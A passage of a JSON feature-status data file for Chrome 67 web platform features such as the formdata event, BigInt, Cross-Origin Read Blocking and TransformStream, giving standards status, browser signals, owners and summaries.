      "when": "2018-04-06 07:08:08.610120",
      "by": "tkent@chromium.org"
    },
    "first_of_milestone": true,
    "name": "'formdata' event",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 67
        },
        "owners": [
          "tkent@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Forms"
        ],
        "desktop": 67,
        "flag": true,
        "android": 67,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=825684",
        "intervention": false
      },
      "opera": {
        "android": 54,
        "desktop": 54
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The 'formdata' event enables any objects to provide form data.  It helps avoid creating <input type=hidden> representing application state, or making submittable custom elements.\r\n\r\n",
    "id": 5662230242656256,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1JO8puctCSpW-ZYGU8lF-h4FWRIDQNDVexzHoOQ2iQmY/edit?usp=sharing"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-04-05 14:43:12.548510",
      "by": "jmedley@google.com"
    },
    "name": "-webkit-box-flex-group, -webkit-box-lines, % values of -webkit-line-clamp",
    "tags": [
      "-webkit-box",
      "css",
      "layout"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 5
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 67
        },
        "owners": [
          "ikilpatrick@chromium.org"
        ],
        "prefixed": true,
        "origintrial": false,
        "webview": 67,
        "blink_components": [
          "Blink>Layout"
        ],
        "desktop": 67,
        "flag": false,
        "android": 67,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=818691",
        "intervention": false
      },
      "opera": {
        "android": 54,
        "desktop": 54
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "-webkit-box-flex-group - This property has virtually zero usage based on the UseCounter on stable. \r\n\r\n% values of -webkit-line-clamp - There is interest in finding a standards based solution to the number values usecase, but we haven’t seen demand for the %-based values.\r\n\r\n-webkit-box-lines - This property was never fully implemented. It was originally intended such that a “vertical”/”horizontal” -webkit-box can have multiple rows/columns.",
    "id": 5393405823680512,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-04-05 19:00:03.953460",
      "by": "jmedley@google.com"
    },
    "name": "<foreignObject> will be a stacking context",
    "tags": [
      "SVG",
      "stacking context"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://svgwg.org/svg2-draft/single-page.html#render-EstablishingStackingContex",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 67
        },
        "owners": [
          "chrishtr@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 67,
        "blink_components": [
          "Blink>SVG"
        ],
        "desktop": 67,
        "flag": false,
        "android": 67,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=723076",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "SVG2 specifies that <foreignObject> to be a stacking context (*). Previously,\r\nChrome did not follow the SVG2 spec. Making <foreignObject> a stacking context allows developers to place HTML content underneath a <foreignObject> without confusion. For example, it wouldn't make much sense to place content at z-index:1 above the containing SVG.\r\n\r\nGecko and Edge already implement this behavior.\r\n\r\n(*) https://svgwg.org/svg2-draft/single-page.html#render-EstablishingStackingContex\r\n",
    "id": 5663772639232000,
    "resources": {
      "samples": [
        "Example of elements under <foreignObject> with z-index: http://output.jsbin.com/takesol"
      ]
    }
  },
  {
    "category": "Device",
    "updated": {
      "when": "2018-04-16 20:53:41.335710",
      "by": "tbansal@google.com"
    },
    "name": "Accept-CH-Lifetime support for requesting client hints",
    "tags": [
      "client hints",
      "blink",
      "screen size",
      "device memory",
      "rtt",
      "downlink",
      "ect",
      "effective type"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://tools.ietf.org/html/draft-ietf-httpbis-client-hints-05#section-2.2.2",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 67
        },
        "owners": [
          "tbansal@chromium.org",
          "igrigorik@chromium.org",
          "bengr@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Loader"
        ],
        "desktop": 67,
        "flag": false,
        "android": 67,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=735518",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Client Hints enables user agents to provide device-specific preferences in the HTTP request headers. Accept-CH-Lifetime adds a client hint that allow origins to persist their opt-in policy for a specified period so they can receive client hints on main frame requests. Additionally, on the first page load, this feature provides hints for all subresources of the page.\r\n\r\nThis is expected to be enabled by default in Chrome 67.",
    "id": 5713139295322112,
    "resources": {
      "docs": [
        "https://lists.w3.org/Archives/Public/ietf-http-wg/2018JanMar/0235.html"
      ],
      "samples": [
        "https://bit.ly/client-hints-demo"
      ]
    }
  },
  {
    "category": "Device",
    "updated": {
      "when": "2018-06-08 20:41:42.441799",
      "by": "jmedley@google.com"
    },
    "name": "Ambient Light Sensor API - based on Generic Sensor API.",
    "comments": "This is behind the #enable-generic-sensor-extra-classes flag in chrome://flags.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://w3c.github.io/ambient-light/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/API/DeviceLightEvent",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 67
        },
        "owners": [
          "rijubrata.bhaumik@intel.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 67,
        "blink_components": [
          "Blink>Sensor"
        ],
        "desktop": 67,
        "flag": false,
        "android": 67,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=606766",
        "intervention": false
      },
      "opera": {
        "android": 54,
        "desktop": 54
      },
      "edge": {
        "view": {
          "url": "http://status.modern.ie/ambientlightevents",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This API is a handy way to make a web page or web app aware of any change in light intensity.\r\n\r\nSee also https://w3c.github.io/sensors/",
    "id": 5298357018820608,
    "resources": {}
  },
  {
    "category": "Security",
    "updated": {
      "when": "2018-04-30 15:18:44.182710",
      "by": "jmedley@google.com"
    },
    "name": "AppCache on Non-secure Contexts",
    "tags": [
      "Security",
      "OWP",
      "AppCache"
    ],
    "comments": "Part of the larger effort to remove powerful features on insecure origins:\r\nhttps://www.chromium.org/Home/chromium-security/deprecating-powerful-features-on-insecure-origins \r\n\r\nblink-dev discussion and API owner approval: https://groups.google.com/a/chromium.org/forum/#!topic/blink-dev/UKF8cK0EwMI",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Deprecated",
          "val": 6,
          "milestone_str": 67
        },
        "owners": [
          "jww@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 67,
        "blink_components": [
          "Blink"
        ],
        "desktop": 67,
        "flag": false,
        "android": 67,
        "bug": "https://crbug.com/588931",
        "intervention": false
      },
      "opera": {
        "android": 54,
        "desktop": 54
      },
      "edge": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "Per https://w3c.github.io/webappsec-secure-contexts/, we are deprecating and then removing AppCache from insecure contexts. AppCache is a powerful feature that allows offline and persistent access to an origin, which is a powerful privilege escalation for an XSS. This will remove that attack vector by only allowing it over HTTPS.\r\n\r\nThis feature is expected to be removed in Chrome 69.",
    "id": 5714236168732672,
    "resources": {
      "docs": [
        "https://www.chromium.org/Home/chromium-security/deprecating-powerful-features-on-insecure-origins"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-04-24 14:50:06.416710",
      "by": "mathiasb@google.com"
    },
    "name": "BigInt: arbitrary-precision integers",
    "tags": [
      "bigint",
      "bignum",
      "arbitrary",
      "precision",
      "integer"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://github.com/tc39/proposal-bigint",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1366287",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 67
        },
        "owners": [
          "neis@chromium.org",
          "jkummerow@chromium.org",
          "adamk@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 67,
        "blink_components": [
          "Blink>JavaScript>Language"
        ],
        "desktop": 67,
        "flag": false,
        "android": 67,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=6791",
        "intervention": false
      },
      "opera": {
        "android": 54,
        "desktop": 54
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=179001",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "JavaScript gets a new numeric primitive that provides support for arbitrary-precision integers. `Number`s in JavaScript are represented as double-precision floats, giving them limited precision. `BigInt`s, on the other hand, can safely store and operate on large integers even beyond the safe integer limit for `Number`s.\r\n",
    "id": 5371603852460032,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1n3tBP90XibvnHMFCY3vdhvkXHFp2joSZp7qnqBtn0PU/edit"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-03-23 15:46:04.748910",
      "by": "jmedley@google.com"
    },
    "name": "Boolean return value of DOMTokenList replace()",
    "tags": [
      "DOMTokenList"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://dom.spec.whatwg.org/#dom-domtokenlist-replace",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1444909",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 67
        },
        "owners": [
          "yuhong.sha@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 67,
        "blink_components": [
          "Blink>DOM"
        ],
        "desktop": 67,
        "flag": false,
        "android": 67,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=820988",
        "intervention": false
      },
      "opera": {
        "android": 54,
        "desktop": 54
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/16344078/",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=183567",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The DOM specification was updated so that DOMTokenList replace() returns a boolean value. This is useful for code which takes different paths depending on whether a replacement occurred, avoiding the need for an extra condition using contains().\r\n\r\n\r\n",
    "id": 5690841569951744,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-04-13 15:37:03.160160",
      "by": "jmedley@google.com"
    },
    "name": "CSS Selectors 4 Pseudo-Class :focus-visible",
    "tags": [
      "focus",
      "css"
    ],
    "comments": "This pseudo-class applies while an element matches the :focus pseudo-class and the UA determines via heuristics that the focus should be made evident on the element. (Many browsers show a “focus ring” by default in this case.)\r\n\r\nNote: Firefox currently ships a similar selector, :-moz-focusring, which the :focus-visible pseudo-class is based on. However, they have not yet publicly declared support for :focus-visible.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://drafts.csswg.org/selectors-4/#the-focus-visible-pseudo",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/CSS/:-moz-focusring",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 67
        },
        "owners": [
          "robdodson@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 67,
        "flag": true,
        "android": 67,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=817199",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The :focus-visible pseudo-class makes it easier for developers to create focus styles that appropriately match the user's input modality. It is designed to help prevent a common anti-pattern where developers remove focus outlines for mouse users, and inadvertently make their sites inaccessible to keyboard users.",
    "id": 5823526732824576,
    "resources": {}
  },
  {
    "category": "Security",
    "updated": {
      "when": "2018-06-01 06:57:15.184760",
      "by": "creis@chromium.org"
    },
    "name": "Cross-Origin Read Blocking (CORB)",
    "tags": [
      "CORB"
    ],
    "comments": "Many of the effects of CORB are not observable since the responses it blocks tend to be opaque to web pages in the first place.  However, there are 4 observable changes to the web platform to make CORB possible, as outlined in the Blink Intent here:\r\nhttps://groups.google.com/a/chromium.org/d/msg/blink-dev/hnAWBzq1qys/XwLxNT9oCQAJ\r\n\r\nWeb developers can learn more about how CORB affects their sites at https://www.chromium.org/Home/chromium-security/corb-for-developers.",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://fetch.spec.whatwg.org/#corb",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://groups.google.com/a/chromium.org/d/msg/site-isolation-dev/pp5C8XKz7AI/2zNOn-S_BgAJ",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 67
        },
        "owners": [
          "creis@chromium.org",
          "nick@chromium.org",
          "lukasza@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 68,
        "blink_components": [
          "Blink>SecurityFeature"
        ],
        "desktop": 67,
        "flag": false,
        "android": 68,
        "bug": "https://crbug.com/802835",
        "intervention": false
      },
      "opera": {
        "android": 54,
        "desktop": 54
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://github.com/whatwg/fetch/issues/687",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Cross-Origin Read Blocking (CORB) is an algorithm that can identify and block dubious cross-origin resource loads in web browsers before they reach the web page. CORB reduces the risk of leaking sensitive data by keeping it further from cross-origin web pages. In most browsers, it keeps such data out of untrusted script execution contexts. In browsers with Site Isolation, it can keep such data out of untrusted renderer processes entirely, helping even against side channel attacks like Spectre.",
    "id": 5629709824032768,
    "resources": {
      "docs": [
        "https://chromium.googlesource.com/chromium/src/+/master/services/network/cross_origin_read_blocking_explainer.md",
        "https://www.chromium.org/Home/chromium-security/corb-for-developers",
        "https://github.com/whatwg/fetch/issues/681"
      ],
      "samples": [
        "https://anforowicz.github.io/xsdb-demo/index.html"
      ]
    }
  },
  {
    "category": "Web Components",
    "updated": {
      "when": "2018-04-13 21:02:45.672240",
      "by": "jmedley@google.com"
    },
    "name": "Customized built-in elements",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://html.spec.whatwg.org/#custom-elements-customized-builtin-example",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://hg.mozilla.org/mozilla-central/log/tip/dom/base/CustomElementsRegistry.h",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 67
        },
        "owners": [
          "tkent@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 67,
        "blink_components": [
          "Blink>HTML>CustomElements"
        ],
        "desktop": 67,
        "flag": false,
        "android": 67,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=648828",
        "intervention": false
      },
      "opera": {
        "android": 55,
        "desktop": 55
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/status/customelements/?q=custom%20elements",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://github.com/w3c/webcomponents/issues/509#issuecomment-230700060",
          "text": "Opposed",
          "val": 7
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Authors can now create custom elements which inherit from the semantics of native, built-in elements. This is helpful when web authors want to add features to their custom elements, but they cannot be implemented in CSS or JavaScript though the features are available in built-in elements.",
    "id": 4670146924773376,
    "resources": {
      "docs": [
        "https://developers.google.com/web/fundamentals/web-components/customelements#extendhtml"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2018-04-16 20:40:59.761610",
      "by": "jmedley@google.com"
    },
    "name": "Fixes to modifier flags on AltGraph-shifted keydown/keypress/keyup events under Windows.",
    "tags": [
      "keyevent",
      "keydown",
      "keypress",
      "keyup",
      "altgraph",
      "control",
      "alt",
      "modifiers"
    ],
    "comments": "Note: This change applies to Windows only.\r\n\r\nFor developers this removes a weird edge-case from keyboard event modifier handling.  If an app handles keydown/keypress/keyup to implement shortcuts, it will no longer need work-arounds to cope with certain (mainly European) keyboard layouts.  For example, if an app uses Ctrl+# as a shortcut (as GMail did) then previously the app would need to check for both Ctrl, and for AltGraph, otherwise French users would not be able to use it.",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 5
      },
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/w3c/uievents/issues/147#issuecomment-344521759",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 67
        },
        "owners": [
          "wez@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "UI>Input"
        ],
        "desktop": 67,
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=25503",
        "intervention": false
      },
      "opera": {
        "desktop": 54
      },
      "edge": {
        "view": {
          "url": "https://github.com/w3c/uievents/issues/147#issuecomment-372906620",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "In Windows the right-hand Alt key serves as AltGraph (ISO-Level-3-Shift) on some layouts (for example, many European language layouts), to allow generating additional printable characters. Internally the key generates Ctrl+Alt modifiers, so that Chrome reports all of Control, Alt and AltGraph in the flags for these keys. In this change, Chrome distinguishes AltGraph from Ctrl+Alt under Windows for consistency with modifiers on other platforms.\r\n\r\nSee the comments for how this helps developers.",
    "id": 5059438092222464,
    "resources": {}
  },
  {
    "category": "Device",
    "updated": {
      "when": "2018-04-13 19:36:51.166140",
      "by": "jmedley@google.com"
    },
    "name": "Motion sensors APIs based on Generic Sensor API",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://www.w3.org/TR/generic-sensor/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/mozilla/standards-positions/issues/35",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 67
        },
        "owners": [
          "alexander.shalamov@intel.com",
          "mikhail.pozdnyakov@intel.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 67,
        "blink_components": [
          "Blink>Sensor"
        ],
        "desktop": 67,
        "flag": false,
        "android": 67,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=750018",
        "intervention": false
      },
      "opera": {
        "android": 54,
        "desktop": 54
      },
      "edge": {
        "view": {
          "url": "https://groups.google.com/a/chromium.org/d/msg/blink-dev/r8iKkTXftm4/XqGPBqKLBQAJ",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Motion sensors extends the Generic Sensor API to expose a set of low-level and fusion sensors. This feature includes JS interfaces representing accelerometers, linear acceleration sensors, gyroscopes, absolute orientation sensors and relative orientation sensors.",
    "id": 5698781827825664,
    "resources": {
      "docs": [
        "https://www.w3.org/TR/generic-sensor/",
        "https://w3c.github.io/accelerometer/",
        "https://w3c.github.io/gyroscope/",
        "https://w3c.github.io/orientation-sensor/",
        "https://w3c.github.io/motion-sensors/",
        "https://developers.google.com/web/updates/2017/09/sensors-for-the-web"
      ],
      "samples": [
        "https://intel.github.io/generic-sensor-demos/"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-04-20 14:17:47.025530",
      "by": "hbos@chromium.org"
    },
    "name": "RTCRtpSender/RTCRtpReceiver.getStats and RTCPeerConnection.getStats(MediaStreamTrack?)",
    "tags": [
      "getStats RTCPeerConnection RTCRtpSender RTCRtpReceiver RTCStatsReport stats selection algorithm RTCStats"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/webrtc-pc/#the-stats-selection-algorithm",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/catalog/?page=1&q=RTCRtpSender",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 67
        },
        "owners": [
          "hbos@chromium.org",
          "hta@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 67,
        "blink_components": [
          "Blink>WebRTC>PeerConnection"
        ],
        "desktop": 67,
        "flag": false,
        "android": 67,
        "bug": "https://crbug.com/680172",
        "intervention": false
      },
      "opera": {
        "android": 54,
        "desktop": 54
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "New WebRTC implementations provided a filtered view of the statistics returned by getStats() in RTCRtpSender, RTCRtpReceiver, and RTCPeerConnection, returning only stats that are relevant to the sender, receiver, or track. This change adds convenience for developers by requiring less code for filtering. Because this is based on the spec it increases cross-browser compatibility. ",
    "id": 5647724393267200,
    "resources": {}
  },
  {
    "category": "User input",
    "updated": {
      "when": "2018-04-12 18:53:00.075470",
      "by": "jmedley@google.com"
    },
    "name": "Send mouse back/forward buttons to javascript",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/pointerevents/#the-button-property",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 67
        },
        "owners": [
          "dtapuska@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 67,
        "blink_components": [
          "Blink>Input"
        ],
        "desktop": 67,
        "flag": false,
        "android": 67,
        "bug": "https://crbug.com/680741",
        "intervention": false
      },
      "opera": {
        "android": 54,
        "desktop": 54
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Web pages can now process mouse events (mousedown, auxclick, mouseup) for back and forward buttons on mice with five or more buttons. This allows back and forward mouse buttons to be prevented by applications that wish to override them. For example they may be useful for games.",
    "id": 5088301178421248,
    "resources": {
      "docs": [
        "https://github.com/w3c/pointerevents/issues/191"
      ]
    }
  },
  {
    "category": "Web Components",
    "updated": {
      "when": "2018-05-15 07:38:59.538540",
      "by": "hayato@chromium.org"
    },
    "name": "Slots in a flat tree",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/css-scoping/#flattening",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 67
        },
        "owners": [
          "hayato@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>DOM>ShadowDOM"
        ],
        "desktop": 67,
        "flag": false,
        "android": 67,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=660265",
        "intervention": false
      },
      "opera": {
        "android": 54,
        "desktop": 54
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The <slot> element can now participate in a flat (layout) tree, with UA style: display: contents. Before this change, applying a CSS selector to a <slot> element had no effect. Not only is this fixed, when selectors are applied to a <slot> element, it's children inherit its styles.",
    "id": 5743296429162496,
    "resources": {}
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2018-04-02 15:10:37.614140",
      "by": "ricea@chromium.org"
    },
    "name": "Streams API: TransformStream",
    "tags": [
      "WritableStream",
      "ReadableStream",
      "pipeThrough",
      "pipeTo"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://streams.spec.whatwg.org/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/mozilla/standards-positions/issues/70",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 67
        },
        "owners": [
          "ricea@chromium.org",
          "domenic@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
